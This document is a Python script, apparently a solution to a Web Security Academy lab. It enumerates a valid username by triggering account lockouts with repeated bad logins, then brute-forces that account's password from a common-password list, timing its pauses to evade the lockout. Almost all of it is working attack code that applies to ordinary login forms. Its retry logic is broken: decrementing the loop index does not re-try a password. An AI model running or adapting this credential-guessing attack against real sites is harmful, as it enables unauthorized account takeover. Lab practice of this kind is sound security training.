import requests
import time

login_url = 'https://0aab000403b9c75e8099307300b30071.web-security-academy.net/login'

usernames = [
    "carlos", "root", "admin", "test", "guest", "info", "adm", "mysql", 
    "user", "administrator", "oracle", "ftp", "pi", "puppet", "ansible", 
    "ec2-user", "vagrant", "azureuser", "academico", "acceso", "access", 
    "accounting", "accounts", "acid", "activestat", "ad", "adam", "adkit", 
    "admin", "administracion", "administrador", "administrator", 
    "administrators", "admins", "ads", "adserver", "adsl", "ae", "af", 
    "affiliate", "affiliates", "afiliados", "ag", "agenda", "agent", 
    "ai", "aix", "ajax", "ak", "akamai", "al", "alabama", "alaska", 
    "albuquerque", "alerts", "alpha", "alterwind", "am", "amarillo", 
    "americas", "an", "anaheim", "analyzer", "announce", "announcements", 
    "antivirus", "ao", "ap", "apache", "apollo", "app", "app01", "app1", 
    "apple", "application", "applications", "apps", "appserver", "aq", 
    "ar", "archie", "arcsight", "argentina", "arizona", "arkansas", 
    "arlington", "as", "as400", "asia", "asterix", "at", "athena", 
    "atlanta", "atlas", "att", "au", "auction", "austin", "auth", 
    "auto", "autodiscover"
]

passwords = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", 
    "1234", "111111", "1234567", "dragon", "123123", "baseball", "abc123", 
    "football", "monkey", "letmein", "shadow", "master", "666666", 
    "qwertyuiop", "123321", "mustang", "1234567890", "michael", "654321", 
    "superman", "1qaz2wsx", "7777777", "121212", "000000", "qazwsx", 
    "123qwe", "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", 
    "asdfgh", "hunter", "buster", "soccer", "harley", "batman", "andrew", 
    "tigger", "sunshine", "iloveyou", "2000", "charlie", "robert", 
    "thomas", "hockey", "ranger", "daniel", "starwars", "klaster", 
    "112233", "george", "computer", "michelle", "jessica", "pepper", 
    "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777", 
    "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua", 
    "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea", 
    "biteme", "matthew", "access", "yankees", "987654321", "dallas", 
    "austin", "thunder", "taylor", "matrix", "mobilemail", "mom", 
    "monitor", "monitoring", "montana", "moon", "moscow"
]

session = requests.Session()

print("Phase 1: Searching for valid username by detecting account lockout...")
found_username = None
lockout_trigger_count = 0

for username in usernames:
    print(f"\nTesting username: {username}")
    
    initial_response = None
    lockout_detected = False
    
    for attempt in range(7):
        login_data = {
            'username': username,
            'password': 'wrongpassword'
        }
        
        response = session.post(login_url, data=login_data)
        
        if attempt == 0:
            initial_response = response.text
            initial_status = response.status_code
            print(f"  Initial response length: {len(initial_response)}, status: {initial_status}")
        else:
            if response.text != initial_response or response.status_code != initial_status:
                lockout_trigger_count = attempt  # Remember how many attempts it took
                print(f"  [!] Response changed on attempt {attempt + 1}")
                print(f"  New response length: {len(response.text)}, status: {response.status_code}")
                
                lockout_keywords = ['locked', 'blocked', 'too many attempts', 'try again later', 
                                  'temporarily', 'maximum attempts', 'account locked']
                
                for keyword in lockout_keywords:
                    if keyword.lower() in response.text.lower():
                        print(f"  [!] Lockout keyword detected: '{keyword}'")
                        break
                
                lockout_detected = True
                found_username = username
                print(f"  [+] Valid username found: {username}")
                print(f"  [!] Lockout triggered after {lockout_trigger_count} attempts")
                break
        
        time.sleep(0.1)
    
    # Stop checking usernames once we find one
    if lockout_detected:
        break
    
    print(f"  [-] No lockout detected for {username}")

# Phase 2: Test passwords for the found username
if found_username:
    print(f"\n\nPhase 2: Testing passwords for username: {found_username}")
    print("Waiting 60 seconds for lockout to expire...")
    time.sleep(60)
    
    password_found = False
    attempts_since_lockout = 0
    
    for i, password in enumerate(passwords):
        login_data = {
            'username': found_username,
            'password': password
        }
        
        print(f"Trying password {i+1}/{len(passwords)}: {password}")
        response = session.post(login_url, data=login_data)
        attempts_since_lockout += 1
        
        # Check for successful login
        if response.status_code == 302:
            print(f"\n[+] SUCCESS! Found credentials: {found_username}:{password}")
            password_found = True
            break
        elif "Invalid username or password" not in response.text:
            # Check for lockout
            if "too many" in response.text.lower() or "locked" in response.text.lower():
                print(f"  [!] Account locked again after {attempts_since_lockout} attempts")
                print("  Waiting 60 seconds for lockout to expire...")
                time.sleep(60)
                attempts_since_lockout = 0
                # Retry the same password after cooldown
                i -= 1
                continue
            else:
                # Possible success or different response
                if len(response.text) < 100 or "dashboard" in response.text.lower() or "welcome" in response.text.lower():
                    print(f"\n[+] SUCCESS! Found credentials: {found_username}:{password}")
                    password_found = True
                    break
        
        # If we've made attempts equal to the lockout trigger count, wait preemptively
        if attempts_since_lockout >= lockout_trigger_count:
            print(f"  Made {lockout_trigger_count} attempts, waiting 60 seconds to avoid lockout...")
            time.sleep(60)
            attempts_since_lockout = 0
        else:
            time.sleep(0.5)  # Small delay between attempts
    
    if not password_found:
        print(f"\n[-] No valid password found for {found_username}")
else:
    print("\n[-] No valid username found!")

print("\nScan complete!")